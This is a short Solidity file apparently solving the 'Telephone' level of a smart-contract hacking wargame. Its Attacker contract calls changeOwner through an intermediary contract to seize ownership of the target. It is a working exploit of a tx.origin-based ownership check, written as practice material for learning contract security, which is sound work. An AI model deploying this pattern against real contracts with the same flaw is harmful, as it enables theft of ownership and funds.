// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "@levels/Telephone.sol";

contract Attacker {
    Telephone public target;

    constructor(address _target) payable {
        target = Telephone(_target);
    }

    receive() external payable {}

    function exploit() public payable {
        target.changeOwner(address(this));
    }
}
